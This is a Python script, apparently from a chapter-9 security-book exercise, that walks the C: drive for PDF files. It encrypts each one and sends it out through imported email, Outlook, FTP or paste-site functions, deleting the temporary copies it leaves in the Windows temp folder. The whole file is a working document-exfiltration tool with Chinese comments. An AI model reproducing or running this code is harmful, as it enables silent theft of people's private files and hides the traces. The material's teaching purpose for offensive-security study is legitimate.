import os 
from codes.ch09.cryptor import encrypt
from codes.ch09.email_exfil import outlook, plain_email
from codes.ch09.paste_exfil import ie_paste, plain_paste
from codes.ch09.transmit_exfil import plain_ftp, transmit

EXFIL = {
    'outlook': outlook,
    'plain_email': plain_email,
    'plain_ftp': plain_ftp,
    'transmit': transmit,
    'ie_paste': ie_paste,
    'plain_paste': plain_paste,
}

def find_docs(doc_type='.pdf'):
    for parent, _, filenames in os.walk('c:\\'):
        for filename in filenames:
            if filename.endswith(doc_type):
                document_path = os.path.join(parent, filename)
                yield document_path

def exfiltrate(document_path, method):
    # 從來源文件中讀取數據，加密文件後，寫入一個臨時文件夾中
    if method in ['transmit', 'plain_ftp']:
        filename = f"c:\\windows\\temp\\{os.path.basename(document_path)}"
        with open(document_path, 'rb') as f0:
            contents = f0.read()
        with open(filename, 'wb') as f1:
            f1.write(encrypt(contents))
        # transmit('mysecrets.txt')
        EXFIL[method](filename)
        # remove (delete) the file
        os.unlink(filename)
    else:
        # 讀取要滲透的文件內容
        with open(document_path, 'rb') as f:
            contents = f.read()
        title = os.path.basename(document_path)
        contents = encrypt(contents)
        # 發送滲透郵件或是創建滲透便簽, ex: plain_email(subject, contents)
        EXFIL[method](title, contents)

if __name__ == '__main__':
    for fpath in find_docs():
        exfiltrate(fpath, 'plain_paste')